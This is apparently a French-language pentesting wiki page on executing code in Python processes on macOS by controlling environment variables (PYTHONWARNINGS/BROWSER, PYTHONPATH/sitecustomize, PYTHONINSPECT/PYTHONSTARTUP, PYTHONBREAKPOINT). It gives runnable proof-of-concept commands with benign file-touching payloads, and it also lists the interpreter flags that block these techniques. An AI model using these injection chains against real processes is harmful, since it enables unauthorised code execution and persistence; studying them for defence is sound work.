# Injection d’applications Python macOS

{{#include ../../../banners/hacktricks-training.md}}

## Via les variables d’environnement `PYTHONWARNINGS` et `BROWSER`

Si un attaquant peut contrôler l’environnement d’un processus Python, la combinaison de `PYTHONWARNINGS` et de `BROWSER` peut déclencher une command execution lorsque Python importe le module `antigravity` lors du traitement d’une option d’avertissement spécialement conçue. Cette technique repose sur le fait que `antigravity` ouvre une URL avec le module `webbrowser` de Python, qui tient compte de la variable d’environnement `BROWSER`.<sup>[[1]](#references)</sup>

```bash
# Generate an example Python script.
echo "print('hi')" > /tmp/script.py

# Create /tmp/hacktricks through the inherited environment.
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# With isolated mode, inject the warning rule using -W instead.
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```

## Via `PYTHONPATH` et `sitecustomize.py`

Au démarrage normal, le module Python `site` ajoute les chemins propres au site, puis tente d’importer un module nommé `sitecustomize`. En plaçant un répertoire lisible par l’attaquant en tête de `PYTHONPATH`, un attaquant qui contrôle l’environnement du processus peut faire importer un payload avant le script cible. L’option `-S` désactive l’initialisation automatique de `site`, tandis que le mode isolé (`-I`) ignore `PYTHONPATH` et implique `-s` et `-E`.<sup>[[2]](#references)[[3]](#references)</sup>

```bash
mkdir -p /tmp/python-startup
cat >/tmp/python-startup/sitecustomize.py <<'EOF'
from pathlib import Path
Path('/tmp/python-sitecustomize-executed').touch()
EOF

PYTHONPATH=/tmp/python-startup python3 /tmp/script.py
```

Pour assurer la persistance via un site utilisateur accessible en écriture plutôt qu’avec un `PYTHONPATH` hérité, voir [Python `.pth`, `.start`, and `usercustomize` startup files](../../macos-auto-start-locations.md#python-startup-files-pth--usercustomize--sitecustomize).

## Via `PYTHONINSPECT` et `PYTHONSTARTUP` après un script

Sur CPython 3.13+, un script lancé avec `PYTHONINSPECT=1` ouvre une session interactive à la fin de son exécution. Si l’entrée standard est un terminal et que PyREPL est disponible, cette session exécute le fichier indiqué par `PYTHONSTARTUP` **après** le script cible et avant l’invite de commande. Un attaquant qui contrôle les deux variables héritées et un fichier de démarrage lisible peut donc exécuter du code dans le processus cible sans modifier son script. Il s’agit d’un déclencheur post-script, et non d’un hook de démarrage classique.<sup>[[3]](#references)[[5]](#references)[[6]](#references)</sup>

```bash
cat >/tmp/python-post.py <<'EOF'
from pathlib import Path
Path('/tmp/python-post-executed').touch()
EOF

# Run from a terminal using CPython 3.13+; exit the resulting prompt with Ctrl-D.
PYTHONINSPECT=1 PYTHONSTARTUP=/tmp/python-post.py python3.13 /tmp/script.py
```

La chaîne n’exécute pas le fichier de démarrage sur les anciennes versions de CPython, lorsque l’entrée standard n’est pas un terminal, ou lorsque `PYTHON_BASIC_REPL` force le REPL de base. `-E` et `-I` ignorent les variables `PYTHON*`. Vérifiez l’interpréteur réel et le contexte du terminal avant de vous fier à cette méthode.<sup>[[3]](#references)[[5]](#references)</sup>

## Via `PYTHONBREAKPOINT`

Depuis Python 3.7 (PEP 553), la fonction intégrée `breakpoint()` importe et appelle ce vers quoi pointe `sys.breakpointhook`, et cette cible est définie par la variable d’environnement **`PYTHONBREAKPOINT`** (`package.module.callable`). L’importation du module nommé et l’appel de la fonction exécutable ont lieu avant que le débogueur n’apparaisse normalement. Un attaquant qui contrôle l’environnement d’un processus qui atteint un `breakpoint()` (cas fréquent dans les scripts de maintenance/de débogage, et parfois encore présent dans des chemins de production) peut donc exécuter du code.<sup>[[4]](#references)</sup>

```bash
cat >/tmp/bp.py <<'EOF'
import sys
print("before")
breakpoint(*sys.argv[1:])
EOF

# breakpoint() invokes the chosen callable with its arguments
PYTHONBREAKPOINT="os.system" python3 /tmp/bp.py "touch /tmp/py-bp-executed"
ls -la /tmp/py-bp-executed
```

Contrairement à `PYTHONWARNINGS`/`PYTHONPATH`, cette méthode exige que la cible atteigne effectivement un appel à `breakpoint()`, mais elle fonctionne aussi uniquement par les **effets de bord de l’importation** du module indiqué (indiquez n’importe quel module importable — par exemple, un module placé en premier dans `PYTHONPATH` — dont le code de niveau supérieur s’exécute). Définir `PYTHONBREAKPOINT=0` désactive complètement le hook.



## References

- [1] [Hacking avec des variables d’environnement - elttam](https://www.elttam.com/blog/env/)
- [2] [site — Hook de configuration spécifique au site](https://docs.python.org/3/library/site.html)
- [3] [Ligne de commande et environnement Python](https://docs.python.org/3/using/cmdline.html)
- [4] [PEP 553 — Fonction intégrée breakpoint() et PYTHONBREAKPOINT](https://peps.python.org/pep-0553/)
- [5] [Dispatch REPL de l’interpréteur CPython (`Modules/main.c`)](https://github.com/python/cpython/blob/v3.15.2/Modules/main.c)
- [6] [Exécution du fichier de démarrage de PyREPL par CPython (`Lib/_pyrepl/main.py`)](https://github.com/python/cpython/blob/v3.15.2/Lib/_pyrepl/main.py)
{{#include ../../../banners/hacktricks-training.md}}
